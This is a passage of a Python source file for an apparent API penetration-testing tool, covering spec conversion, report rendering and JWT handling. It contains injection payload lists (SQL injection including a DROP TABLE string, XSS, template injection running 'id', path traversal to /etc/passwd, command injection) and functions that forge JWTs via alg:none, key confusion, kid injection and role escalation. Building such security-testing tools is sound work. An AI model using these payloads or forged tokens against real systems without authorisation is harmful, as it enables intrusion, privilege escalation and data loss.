#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════╗
║                    ⚡ APIvolt v1.0 ⚡                     ║
║         Comprehensive API Security Testing Suite          ║
╚═══════════════════════════════════════════════════════════╝

Description:
    APIvolt is an API security testing tool that ingests API definitions
    (OpenAPI/Swagger YAML/JSON or Postman collections) and performs
    comprehensive penetration testing with structured findings output.

    Supports bidirectional conversion between OpenAPI ↔ Postman formats.

Capabilities:
    Input Formats:    OpenAPI 3.x / Swagger 2.x (YAML/JSON), Postman v2.1
    Converters:       OpenAPI → Postman, Postman → OpenAPI
    Auth Schemes:     JWT Bearer, API Key, Cookie, Basic Auth
    Test Modules:
      - AuthZ Matrix      (--test-unauth)     Authenticated vs Unauthenticated
      - BOLA/IDOR         (--test-bola)       Horizontal privilege escalation
      - BFLA              (--test-bfla)       Vertical privilege escalation
      - Method Tampering  (--test-method)     Undocumented HTTP methods
      - Mass Assignment   (--test-mass)       Extra field injection
      - JWT Manipulation  (--test-jwt)        alg:none, sig strip, exp bypass, kid inject
      - Content-Type      (--test-ctype)      Parser confusion attacks
      - Schema Validation (--test-schema)     Response vs spec drift
      - Rate Limiting     (--test-rate)       Burst detection
      - Security Headers  (--test-headers)    Missing headers, CORS, info leak
      - Injection Fuzzing (--fuzz)            SQLi, XSS, SSTI, traversal, cmdi

Usage:
    # Load from OpenAPI spec
    apivolt spec.yaml -b https://api.example.com --jwt <token> --list

    # Load from Postman collection
    apivolt collection.json -b https://api.example.com --jwt <token> --from-postman --list

    # Convert Postman → OpenAPI
    apivolt collection.json --from-postman --to-openapi output_spec.yaml

    # Convert OpenAPI → Postman
    apivolt spec.yaml -b https://api.example.com --export-postman collection.json

    # JWT manipulation testing
    apivolt spec.yaml -b https://api.example.com --jwt <token> --test-jwt

    # Content-Type confusion testing
    apivolt spec.yaml -b https://api.example.com --jwt <token> --test-ctype

    # Response schema validation
    apivolt spec.yaml -b https://api.example.com --jwt <token> --test-schema

    # Full pentest suite
    apivolt spec.yaml -b https://api.example.com --jwt <token> \\
        --jwt-secondary <user2> --test-all --report-json findings.json

Author: APIvolt Project
"""

import argparse
import base64
import copy
import hashlib
import hmac
import html as _htmlmod
import json
import logging
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import termios
import time
import tty
import uuid
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs

import requests
import yaml

# Disable SSL warnings when using proxy (common in pentesting)
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

__version__ = '0.1.0'
TOOL_NAME = 'APIvolt'

BANNER = f"""
{chr(27)}[94m╔═══════════════════════════════════════════════════════════╗
║{chr(27)}[93m                    ⚡ {TOOL_NAME} v{__version__} ⚡                     {chr(27)}[94m║
║{chr(27)}[96m         Comprehensive API Security Testing Suite          {chr(27)}[94m║
╚═══════════════════════════════════════════════════════════╝{chr(27)}[0m
"""


class Colors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'


def str2bool(v: str) -> bool:
    if isinstance(v, bool):
        return v
    return v.lower() in ("1", "true", "yes", "y", "on")


# ---------------------------------------------------------------------------
# Fuzz payloads
# ---------------------------------------------------------------------------
FUZZ_PAYLOADS = {
    'sqli': [
        "' OR '1'='1", "' OR '1'='1'--", "\" OR \"1\"=\"1",
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
        "1' AND SLEEP(5)--", "1 OR 1=1", "admin'--",
    ],
    'xss': [
        "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
        "{{7*7}}", "${7*7}", "<svg/onload=alert(1)>", "javascript:alert(1)",
    ],
    'ssti': [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self.__class__.__mro__}}",
        "{%import os%}{{os.popen('id').read()}}",
    ],
    'path_traversal': [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
    ],
    'cmdi': [
        "; id", "| id", "$(id)", "`id`", "& whoami", "|| whoami",
    ],
    'nosqli': [
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
        "[$ne]=1", "[$gt]=",
    ],
}

SECURITY_HEADERS = [
    'Strict-Transport-Security', 'X-Content-Type-Options',
    'X-Frame-Options', 'Content-Security-Policy', 'X-XSS-Protection',
    'Referrer-Policy', 'Permissions-Policy', 'Cache-Control',
    'X-Permitted-Cross-Domain-Policies',
]

INFO_LEAK_HEADERS = [
    'Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
    'X-Runtime', 'X-Debug-Token', 'X-Debug-Token-Link',
]


# ===================================================================
# Terminal UI (rich): a live scan panel and a findings report.
# Degrades to the plain-ANSI logger output if rich is unavailable.
# ===================================================================
try:
    from rich import box as _rich_box
    from rich.console import Console as _Console, Group as _Group
    from rich.live import Live as _Live
    from rich.panel import Panel as _Panel
    from rich.table import Table as _Table
    from rich.text import Text as _Text
    _HAS_RICH = True
except Exception:  # pragma: no cover - rich is a declared dependency
    _HAS_RICH = False

BOLT = '⚡'  # the apivolt mark
_ACCENT = '#00f0ff'
_SEV_STYLE = {
    'CRITICAL': 'bold #ff3366', 'HIGH': '#ff6b4a', 'MEDIUM': '#ff9500',
    'LOW': '#a855f7', 'INFO': 'grey58',
}
_SEV_ORDER = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}


class ScanUI:
    """A rounded live panel, one row per module, in agentmap's house style."""

    def __init__(self, header: str):
        self.header = header
        self.rows: list[tuple] = []  # (state, module, badge, count, elapsed)
        self.console = _Console() if _HAS_RICH else None
        self.is_tty = bool(self.console and self.console.is_terminal)
        self._live = None

    def _panel(self, footer=""):
        table = _Table.grid(padding=(0, 1), expand=True)
        table.add_column(justify="center", width=1)      # glyph
        table.add_column(width=24, no_wrap=True)          # module
        table.add_column(width=6, no_wrap=True)           # badge
        table.add_column(width=13, no_wrap=True)          # findings count
        table.add_column(ratio=1, justify="right")        # elapsed
        for state, module, badge, count, elapsed in self.rows:
            if state == "run":
                glyph, gstyle, bstyle = "●", "#ffcc00", "#ffcc00 reverse"
            else:
                glyph, gstyle, bstyle = "●", "#00ff88", "#00ff88"
            cnt = _Text(no_wrap=True)
            if count:
                cnt.append(f"{count:>3}", style=_ACCENT)
                cnt.append(" finding" + ("" if count == 1 else "s"))
            elif state == "done":
                cnt.append("  0", style="grey50")
                cnt.append(" findings", style="grey50")
            table.add_row(_Text(glyph, style=gstyle), _Text(module),
                          _Text(badge, style=bstyle), cnt,
                          _Text(elapsed, style="grey50"))
        body = _Group(_Text.from_markup(self.header), _Text(""), table,
                      _Text(""), footer if isinstance(footer, _Text) else _Text.from_markup(footer))
        return _Panel(body, box=_rich_box.ROUNDED, border_style="grey35",
                      padding=(0, 1), title="[grey42]scan[/]", title_align="left")

    def start(self):
        if self.is_tty:
            self._live = _Live(self._panel(), console=self.console,
                               refresh_per_second=8, transient=False)
            self._live.start()

    def set_running(self, module: str):
        self.rows.append(["run", module, "RUN", 0, ""])
        if self._live:
            self._live.update(self._panel())

    def set_done(self, count: int, elapsed: float):
        if self.rows:
            self.rows[-1] = ["done", self.rows[-1][1], "DONE", count, f"{elapsed:.2f}s"]
        if self._live:
            self._live.update(self._panel())

    def finish(self, findings: list, elapsed: float):
        footer = _footer_line(findings, elapsed)
        if self._live:
            self._live.update(self._panel(footer))
            self._live.stop()
        elif self.console:
            self.console.print(self._panel(footer))


def _footer_line(findings: list, elapsed: float):
    counts = defaultdict(int)
    for f in findings:
        counts[f['severity']] += 1
    t = _Text()
    t.append(str(len(findings)), style=_ACCENT)
    t.append(" finding" + ("" if len(findings) == 1 else "s"))
    worst = next((s for s in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW') if counts[s]), None)
    if worst:
        t.append("  (")
        t.append(str(counts[worst]), style=_SEV_STYLE[worst])
        t.append(" " + worst.lower(), style=_SEV_STYLE[worst])
        t.append(")")
    t.append("  ")
    t.append(f"{elapsed:.1f}s")
    return t


def _short_finding(title: str) -> str:
    """A concise one-line form of a finding title for the report column.

    Drops the verbose tails that make titles overflow: an "(HTTP 200)" or
    bare "(201)" status suffix, and rewrites titles that pack a value list
    into a readable phrase instead of a dangling "...".
    """
    t = str(title or "")
    t = re.sub(r"\s*\(HTTP \d+\)\s*$", "", t)
    t = re.sub(r"\s*\(\d{3}\)\s*$", "", t)
    if re.match(r"^Missing:\s*\[", t):
        return "Security headers missing"
    if re.match(r"^Injected fields reflected:\s*\[", t):
        return "Injected privileged fields accepted"
    if re.match(r"^Sensitive fields in response:\s*\[", t):
        return "Sensitive fields in response"
    if re.match(r"^Info headers:\s*\{", t):
        return "Server identifies itself in a header"
    # Any other embedded list or dict: drop the ": [...]"/": {...}" tail.
    t = re.sub(r":\s*[\[{].*?[\]}]\s*$", "", t)
    return re.sub(r"\s+", " ", t).strip()


def render_findings(console, findings: list):
    """Print the findings report inside a rounded panel: header, severity tally, table."""
    if not findings:
        console.print(_Text(f"\n{BOLT} no findings", style="#00ff88"))
        return
    counts = defaultdict(int)
    for f in findings:
        counts[f['severity']] += 1

    head = _Text()
    head.append(f"{BOLT} ", style="bold #ffcc00")
    head.append("apivolt findings  ", style="bold")
    head.append(f"({len(findings)} total)", style="grey50")

    tally = _Text()
    for s in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'):
        if counts[s]:
            tally.append(f"{counts[s]} ", style=_SEV_STYLE[s])
            tally.append(f"{s.lower()}   ", style=_SEV_STYLE[s])

    table = _Table(box=_rich_box.SIMPLE_HEAD, show_edge=False, pad_edge=False,
                   expand=True, header_style="grey50")
    table.add_column("SEVERITY", no_wrap=True)
    table.add_column("CATEGORY", style="#7aa2f7", no_wrap=True)
    # Endpoint is bold; a very long path is truncated with an ellipsis so it
    # never pushes the FINDING column off the panel.
    table.add_column("ENDPOINT", style="bold", no_wrap=True, overflow="ellipsis", max_width=30)
    table.add_column("FINDING", ratio=1, overflow="ellipsis", no_wrap=True)
    ordered = sorted(findings, key=lambda f: (_SEV_ORDER.get(f['severity'], 9), f['category']))
    prev = None
    for f in ordered:
        if prev is not None and f['severity'] != prev:
            table.add_row("", "", "", "")  # blank line between severity groups
        table.add_row(
            _Text(f['severity'], style=_SEV_STYLE.get(f['severity'], "")),
            f['category'], f['endpoint'] or "(global)", _short_finding(f['title']))
        prev = f['severity']

    body = _Group(head, _Text(""), tally, _Text(""), table)
    console.print(_Panel(body, box=_rich_box.ROUNDED, border_style="grey35",
                         padding=(0, 1), title="[grey42]findings[/]", title_align="left"))


def _clip(value, limit):
    value = str(value or "")
    return value if len(value) <= limit else value[:limit - 1] + "…"


# ===================================================================
# File reports: Markdown and self-contained HTML, in agentmap's style.
# These keep the FULL finding title and detail (unlike the terminal panel).
# ===================================================================
_SEVS = ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO')
_HTML_SEV = {'CRITICAL': '#ff3366', 'HIGH': '#ff6b4a', 'MEDIUM': '#ff9500',
             'LOW': '#a855f7', 'INFO': '#8a8a9a'}


def _report_meta(engine) -> dict:
    return {
        'tool': TOOL_NAME, 'version': __version__,
        'scan_date': datetime.now().isoformat(timespec='seconds'),
        'target': engine.base_url or '', 'spec': str(engine.spec_path),
        'total': len(engine.findings),
    }


def _counts(findings) -> dict:
    c = {s: 0 for s in _SEVS}
    for f in findings:
        c[f['severity']] = c.get(f['severity'], 0) + 1
    return c


def _md_escape(value) -> str:
    text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', str(value or ''))
    text = text.replace('\\', '\\\\').replace('`', '\\`')
    text = text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    text = text.replace('|', '\\|').replace('\n', ' ').replace('\r', ' ')
    return text


def render_markdown(findings: list, meta: dict) -> str:
    c = _counts(findings)
    lines = [
        f"# {TOOL_NAME} report", "",
        f"Target: `{_md_escape(meta['target'])}`  ",
        f"Spec: `{_md_escape(meta['spec'])}`  ",
        f"Scan date: {meta['scan_date']}  ",
        f"Total findings: {meta['total']}  ",
        "Counts: " + ", ".join(f"{s}={c[s]}" for s in _SEVS), "",
        "| Severity | Category | Endpoint | Finding | Detail |",
        "|---|---|---|---|---|",
    ]
    for f in sorted(findings, key=lambda f: _SEV_ORDER.get(f['severity'], 9)):
        lines.append(f"| {f['severity']} | {_md_escape(f['category'])} | "
                     f"{_md_escape(f['endpoint'])} | {_md_escape(f['title'])} | "
                     f"{_md_escape(f['detail'])} |")
    if not findings:
        lines.append("| - | - | - | - | no findings |")
    return "\n".join(lines) + "\n"


def render_html(findings: list, meta: dict) -> str:
    e = _htmlmod.escape
    c = _counts(findings)
    chips = []
    for s in _SEVS:
        zero = '' if c[s] else ' chip-zero'
        chips.append(f'<span class="chip chip-{s.lower()}{zero}"><b>{c[s]}</b> {s}</span>')
    rows = []
    for f in sorted(findings, key=lambda f: _SEV_ORDER.get(f['severity'], 9)):
        s = f['severity']
        rows.append(
            f'<tr><td class="sev-{s.lower()}">{s}</td>'
            f'<td>{e(str(f["category"]))}</td>'
            f'<td>{e(str(f["endpoint"]))}</td>'
            f'<td>{e(str(f["title"]))}</td>'
            f'<td>{e(str(f["detail"] or ""))}</td></tr>')
    if not findings:
        rows.append('<tr><td colspan="5">no findings</td></tr>')
    css = """
  :root { color-scheme: light dark; }
  body { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; margin: 2rem;
         background: #0a0a0f; color: #e0e0e0; }
  h1 { color: #ffcc00; }
  .meta { color: #8a8a9a; margin: 0.2rem 0 0.9rem; }
  table { border-collapse: collapse; width: 100%; }
  th, td { border: 1px solid #1a1a25; padding: 0.4rem 0.6rem; text-align: left; vertical-align: top; }
  th { background: #1a1a25; }
  .sev-critical { color: #ff3366; font-weight: bold; }
  .sev-high { color: #ff6b4a; }
  .sev-medium { color: #ff9500; }
  .sev-low { color: #a855f7; }
  .sev-info { color: #8a8a9a; }
  .sevbar { display: flex; flex-wrap: wrap; gap: 0.45rem; margin: 0.4rem 0 1.4rem; }
  .chip { display: inline-flex; align-items: baseline; gap: 0.4rem; padding: 0.22rem 0.7rem;
          border: 1px solid currentColor; border-radius: 999px; font-size: 0.82rem;
          text-transform: uppercase; letter-spacing: 0.04em; }
  .chip b { font-size: 1.05rem; font-variant-numeric: tabular-nums; }
  .chip-critical { color: #ff3366; } .chip-high { color: #ff6b4a; }
  .chip-medium { color: #ff9500; } .chip-low { color: #a855f7; }
  .chip-info { color: #8a8a9a; } .chip-zero { opacity: 0.3; }
"""
    return (
        "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n"
        f"<title>{TOOL_NAME} report</title>\n<style>{css}</style>\n</head>\n<body>\n"
        f"<h1>{BOLT} {TOOL_NAME} report</h1>\n"
        f'<p class="meta">Target: {e(str(meta["target"]))} &middot; '
        f'Spec: {e(str(meta["spec"]))} &middot; {e(str(meta["scan_date"]))} &middot; '
        f'Total findings: {meta["total"]}</p>\n'
        f'<div class="sevbar">{"".join(chips)}</div>\n'
        "<table>\n<thead><tr><th>Severity</th><th>Category</th><th>Endpoint</th>"
        "<th>Finding</th><th>Detail</th></tr></thead>\n<tbody>\n"
        + "\n".join(rows) +
        "\n</tbody>\n</table>\n</body>\n</html>\n")


# ===================================================================
# JWT Utilities (standalone, no pyjwt dependency)
# ===================================================================
class JWTUtils:
    """Pure-Python JWT decode / forge utilities for pentest manipulation."""

    @staticmethod
    def b64url_decode(data: str) -> bytes:
        pad = 4 - len(data) % 4
        if pad != 4:
            data += '=' * pad
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    @classmethod
    def decode(cls, token: str) -> tuple[dict, dict, str]:
        """Decode JWT without verification. Returns (header, payload, signature_b64)."""
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
        header = json.loads(cls.b64url_decode(parts[0]))
        payload = json.loads(cls.b64url_decode(parts[1]))
        return header, payload, parts[2]

    @classmethod
    def encode_unsigned(cls, header: dict, payload: dict) -> str:
        """Encode JWT with empty signature (alg:none attack)."""
        h = cls.b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        p = cls.b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        return f"{h}.{p}."

    @classmethod
    def encode_with_hmac(cls, header: dict, payload: dict, key: bytes) -> str:
        """Encode JWT with HMAC-SHA256 (key confusion attack: RS256→HS256)."""
        h = cls.b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        p = cls.b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
        return f"{h}.{p}.{cls.b64url_encode(sig)}"

    @classmethod
    def forge_none(cls, token: str) -> str:
        """Forge token with alg:none (CVE-2015-9235 style)."""
        header, payload, _ = cls.decode(token)
        header['alg'] = 'none'
        return cls.encode_unsigned(header, payload)

    @classmethod
    def forge_none_variants(cls, token: str) -> list[tuple[str, str]]:
        """Generate multiple alg:none bypass variants."""
        header, payload, _ = cls.decode(token)
        variants = []
        for alg_val in ['none', 'None', 'NONE', 'nOnE']:
            h = dict(header)
            h['alg'] = alg_val
            variants.append((alg_val, cls.encode_unsigned(h, payload)))
        # Also try with trailing dot and without
        h = dict(header)
        h['alg'] = 'none'
        hb = cls.b64url_encode(json.dumps(h, separators=(',', ':')).encode())
        pb = cls.b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        variants.append(('none_no_dot', f"{hb}.{pb}"))
        return variants

    @classmethod
    def forge_expired_bypass(cls, token: str) -> str:
        """Re-sign token with exp set far in the future."""
        header, payload, _ = cls.decode(token)
        payload['exp'] = int(datetime.now(timezone.utc).timestamp()) + 86400 * 365
        if 'iat' in payload:
            payload['iat'] = int(datetime.now(timezone.utc).timestamp())
        if 'nbf' in payload:
            payload['nbf'] = int(datetime.now(timezone.utc).timestamp()) - 60
        header['alg'] = 'none'
        return cls.encode_unsigned(header, payload)

    @classmethod
    def forge_key_confusion(cls, token: str, public_key_pem: str) -> str:
        """
        Algorithm confusion: change RS256 → HS256 and sign with the public key.
        Requires the server's RSA public key as PEM string.
        """
        header, payload, _ = cls.decode(token)
        header['alg'] = 'HS256'
        return cls.encode_with_hmac(header, payload, public_key_pem.encode())

    @classmethod
    def forge_kid_injection(cls, token: str, kid_payloads: list[str] | None = None) -> list[tuple[str, str]]:
        """Inject malicious kid (Key ID) values for path traversal / SQLi."""
        header, payload, _ = cls.decode(token)
        if kid_payloads is None:
            kid_payloads = [
                "../../../../../../dev/null",
                "/dev/null",
                "../../../../../../etc/hostname",
                "'; SELECT 'key' --",
                "non_existing_key",
                "| cat /etc/passwd",
            ]
        results = []
        for kid_val in kid_payloads:
            h = dict(header)
            h['kid'] = kid_val
            h['alg'] = 'HS256'
            # Sign with empty key (for /dev/null) or the kid value
            key = b'' if 'null' in kid_val.lower() else kid_val.encode()
            forged = cls.encode_with_hmac(h, payload, key)
            results.append((kid_val, forged))
        return results

    @classmethod
    def forge_sub_claim(cls, token: str, new_sub: str) -> str:
        """Change the sub claim (user identity) with alg:none."""
        header, payload, _ = cls.decode(token)
        payload['sub'] = new_sub
        header['alg'] = 'none'
        return cls.encode_unsigned(header, payload)

    @classmethod
    def forge_role_escalation(cls, token: str) -> list[tuple[str, str]]:
        """Try common role/privilege escalation claim modifications."""
        header, payload, _ = cls.decode(token)
        escalations = []
        role_fields = ['role', 'roles', 'scope', 'scopes', 'permissions',
                       'groups', 'is_admin', 'admin', 'privilege', 'authorities']
        admin_values = {
            'role': 'admin', 'roles': ['admin'], 'scope': 'admin',
            'scopes': ['admin', 'read', 'write'], 'permissions': ['*'],
            'groups': ['admin'], 'is_admin': True, 'admin': True,
            'privilege': 'superuser', 'authorities': ['ROLE_ADMIN'],
        }
        for field in role_fields:
            p = dict(payload)
            p[field] = admin_values.get(field, 'admin')
            h = dict(header)
            h['alg'] = 'none'
            forged = cls.encode_unsigned(h, p)
            label = f"{field}={admin_values.get(field, 'admin')}"
            escalations.append((label, forged))
        return escalations

    @classmethod
    def analyze(cls, token: str) -> dict:
        """Analyze a JWT and return structured info for the report."""
        try:
            header, payload, sig = cls.decode(token)
        except Exception as e:
            return {'valid': False, 'error': str(e)}

        info = {
            'valid': True,
            'header': header,
            'algorithm': header.get('alg', 'unknown'),
            'type': header.get('typ', 'unknown'),
            'kid': header.get('kid'),
            'claims': payload,
            'subject': payload.get('sub'),
            'issuer': payload.get('iss'),
            'audience': payload.get('aud'),
            'has_signature': bool(sig),
            'signature_length': len(sig) if sig else 0,
        }

        # Expiration analysis
        exp = payload.get('exp')
        if exp:
            exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
            info['expires'] = exp_dt.isoformat()
            info['expired'] = datetime.now(timezone.utc) > exp_dt
        else:
            info['expires'] = None
            info['expired'] = None
            info['no_expiry'] = True

        iat = payload.get('iat')
        if iat:
            info['issued_at'] = datetime.fromtimestamp(iat, tz=timezone.utc).isoformat()

        return info


# ===================================================================
# Postman → OpenAPI Converter
# ===================================================================
class PostmanToOpenAPI:
    """Convert Postman Collection v2.1 to OpenAPI 3.0 spec."""

    def __init__(self, collection_path: str):
        with open(collection_path, 'r') as f:
            self.collection = json.load(f)
        self.info = self.collection.get('info', {})

    def convert(self) -> dict:
        spec = {
            'openapi': '3.0.3',
            'info': {
                'title': self.info.get('name', 'Converted API'),
                'description': self.info.get('description', f'Converted from Postman by {TOOL_NAME}'),
                'version': '1.0.0',
            },
            'paths': {},
            'components': {'schemas': {}, 'securitySchemes': {}},
        }

        # Extract servers from variables
        variables = {v['key']: v.get('value', '') for v in self.collection.get('variable', [])}
        base_url = variables.get('baseUrl', variables.get('base_url', ''))
        if base_url:
            spec['servers'] = [{'url': base_url}]

        # Detect auth from variables
        if any(k in variables for k in ('jwt', 'token', 'access_token')):
            spec['components']['securitySchemes']['bearerAuth'] = {
                'type': 'http', 'scheme': 'bearer', 'bearerFormat': 'JWT',
            }
            spec['security'] = [{'bearerAuth': []}]
        if any(k in variables for k in ('apiKey', 'api_key')):
            spec['components']['securitySchemes']['apiKeyAuth'] = {
                'type': 'apiKey', 'in': 'header', 'name': 'X-API-Key',
            }

        # Recursively process items
        items = self._flatten_items(self.collection.get('item', []))

        for item in items:
            req = item.get('request')
            if not req:
                continue
            self._process_request(spec, item, req, variables)

        return spec

    def _flatten_items(self, items: list, parent_tag: str = '') -> list:
        """Recursively flatten Postman folders into a flat item list with tags."""
        flat = []
        for item in items:
            if 'item' in item:
                # It's a folder → use folder name as tag
                tag = item.get('name', parent_tag)
                flat.extend(self._flatten_items(item['item'], tag))
            else:
                if parent_tag:
                    item['_tag'] = parent_tag
                flat.append(item)
        return flat

    def _process_request(self, spec: dict, item: dict, req: dict, variables: dict):
        method = req.get('method', 'GET').lower()

        # Parse URL
        url_obj = req.get('url', '')
        if isinstance(url_obj, str):
            raw_url = url_obj
            path_segments = []
        else:
            raw_url = url_obj.get('raw', '')
            path_segments = url_obj.get('path', [])

        # Extract path from URL, replacing Postman variables
        path = self._extract_path(raw_url, path_segments, variables)
        if not path:
            return

        # Convert Postman :param to OpenAPI {param}
        path_params = []
        converted_path = path
        for match in re.finditer(r':(\w+)', path):
            param_name = match.group(1)
            converted_path = converted_path.replace(f':{param_name}', f'{{{param_name}}}')
            path_params.append(param_name)

        # Also handle {{var}} style
        for match in re.finditer(r'\{\{(\w+)\}\}', converted_path):
            param_name = match.group(1)
            if param_name not in ('baseUrl', 'base_url', 'jwt', 'token', 'apiKey'):
                converted_path = converted_path.replace(f'{{{{{param_name}}}}}', f'{{{param_name}}}')
                if param_name not in path_params:
                    path_params.append(param_name)

        if converted_path not in spec['paths']:
            spec['paths'][converted_path] = {}

        operation = {
            'summary': item.get('name', ''),
            'description': req.get('description', ''),
            'operationId': self._make_operation_id(method, converted_path),
            'parameters': [],
            'responses': {'200': {'description': 'Success'}},
        }

        # Tags
        tag = item.get('_tag')
        if tag:
            operation['tags'] = [tag]

        # Path parameters
        for pname in path_params:
            operation['parameters'].append({
                'name': pname, 'in': 'path', 'required': True,
                'schema': {'type': 'string'},
            })

        # Query parameters
        if isinstance(url_obj, dict):
            for qp in url_obj.get('query', []):
                if qp.get('disabled'):
                    continue
                operation['parameters'].append({
                    'name': qp.get('key', ''),
                    'in': 'query',
                    'required': False,
                    'schema': {'type': 'string'},
                    'description': qp.get('description', ''),
                })

        # Headers (skip standard ones)
        skip_headers = {'content-type', 'authorization', 'accept', 'user-agent', 'host'}
        for hdr in req.get('header', []):
            if hdr.get('disabled'):
                continue
            key = hdr.get('key', '')
            if key.lower() not in skip_headers:
                operation['parameters'].append({
                    'name': key, 'in': 'header', 'required': False,
                    'schema': {'type': 'string'},
                })

        # Request body
        body = req.get('body')
        if body and method in ('post', 'put', 'patch'):
            mode = body.get('mode', '')
            if mode == 'raw':
                raw = body.get('raw', '')
                content_type = 'application/json'
                schema = {'type': 'object'}
                # Try to infer schema from example body
                try:
                    example_obj = json.loads(raw)
                    schema = self._infer_schema(example_obj)
                    schema['example'] = example_obj
                except (json.JSONDecodeError, ValueError):
                    content_type = 'text/plain'
                    schema = {'type': 'string'}

                operation['requestBody'] = {
                    'required': True,
                    'content': {content_type: {'schema': schema}},
                }
            elif mode == 'formdata':
                properties = {}
                for fd in body.get('formdata', []):
                    if fd.get('disabled'):
                        continue
                    ftype = 'string'
                    if fd.get('type') == 'file':
                        ftype = 'string'
                        prop = {'type': ftype, 'format': 'binary'}
                    else:
                        prop = {'type': ftype}
                    properties[fd.get('key', '')] = prop

                if properties:
                    operation['requestBody'] = {
                        'content': {
                            'multipart/form-data': {
                                'schema': {'type': 'object', 'properties': properties}
                            }
                        }
                    }
            elif mode == 'urlencoded':
                properties = {}
                for ue in body.get('urlencoded', []):
                    if ue.get('disabled'):
                        continue
                    properties[ue.get('key', '')] = {'type': 'string'}
                if properties:
                    operation['requestBody'] = {
                        'content': {
                            'application/x-www-form-urlencoded': {
                                'schema': {'type': 'object', 'properties': properties}
                            }
                        }
                    }

        spec['paths'][converted_path][method] = operation

    def _extract_path(self, raw_url: str, path_segments: list, variables: dict) -> str:
        """Extract the API path from a Postman URL."""
        # Replace {{baseUrl}} etc.
        clean = raw_url
        for var_name, var_val in variables.items():
            clean = clean.replace(f'{{{{{var_name}}}}}', var_val)

        # Remove protocol + host to get path
        if '://' in clean:
            parsed = urlparse(clean)
            path = parsed.path
        elif path_segments:
            path = '/' + '/'.join(
                seg for seg in path_segments
                if seg not in ('{{baseUrl}}',)
            )
        else:
            # Fallback: strip everything before first /
            idx = clean.find('/')
            path = clean[idx:] if idx >= 0 else '/' + clean

        # Remove query string
        if '?' in path:
            path = path.split('?')[0]

        return path.rstrip('/') or '/'

    def _make_operation_id(self, method: str, path: str) -> str:
        clean = re.sub(r'[^a-zA-Z0-9]', '_', path).strip('_')
        return f"{method}_{clean}"

    def _infer_schema(self, obj: Any) -> dict:
        """Infer OpenAPI schema from a JSON example object."""
        if isinstance(obj, dict):
            properties = {}
            for k, v in obj.items():
                properties[k] = self._infer_schema(v)
            return {'type': 'object', 'properties': properties}
        elif isinstance(obj, list):
            if obj:
                return {'type': 'array', 'items': self._infer_schema(obj[0])}
            return {'type': 'array', 'items': {'type': 'string'}}
        elif isinstance(obj, bool):
            return {'type': 'boolean'}
        elif isinstance(obj, int):
            return {'type': 'integer'}
        elif isinstance(obj, float):
            return {'type': 'number'}
        else:
            return {'type': 'string'}

    def export(self, output_path: str, fmt: str = 'yaml'):
        spec = self.convert()
        with open(output_path, 'w') as f:
            if fmt == 'json':
                json.dump(spec, f, indent=2)
            else:
                yaml.dump(spec, f, default_flow_style=False, sort_keys=False, allow_unicode=True)
        return spec


# ===================================================================
# Spec Resolution: URL → spec dict (module-level, used by fast path + engine)
# ===================================================================
SPEC_PROBE_PATHS = [
    '/openapi.json', '/openapi.yaml',
    '/swagger.json', '/swagger.yaml',
    '/api-docs', '/api-docs.json',
    '/v1/api-docs', '/v2/api-docs', '/v3/api-docs',
    '/swagger/v1/swagger.json',
    '/docs/openapi.json', '/docs/swagger.json',
    '/.well-known/openapi',
    '/api/openapi.json', '/api/swagger.json',
]


def _is_url(target: str) -> bool:
    return target.startswith('http://') or target.startswith('https://')


def _fetch_spec_from_url(url: str, verify: bool = False, timeout: int = 10) -> dict | None:
    """Fetch and parse an OpenAPI/Swagger spec from a URL. Returns None on failure."""
    try:
        resp = requests.get(url, verify=verify, timeout=timeout)
        if resp.status_code != 200:
            return None
        content = resp.text
        if not content.strip():
            return None
        try:
            spec = json.loads(content)
        except json.JSONDecodeError:
            spec = yaml.safe_load(content)
        # Quick sanity check: does it look like an OpenAPI/Swagger spec?
        if isinstance(spec, dict) and ('paths' in spec or 'openapi' in spec or 'swagger' in spec):
            return spec
        return None
    except Exception:
        return None


def _discover_spec(base_url: str, verify: bool = False, timeout: int = 10) -> tuple[dict | None, str | None]:
    """
    Probe common spec paths on a base URL.
    Returns (spec_dict, found_url) or (None, None).
    """
    base = base_url.rstrip('/')
    for path in SPEC_PROBE_PATHS:
        url = f"{base}{path}"
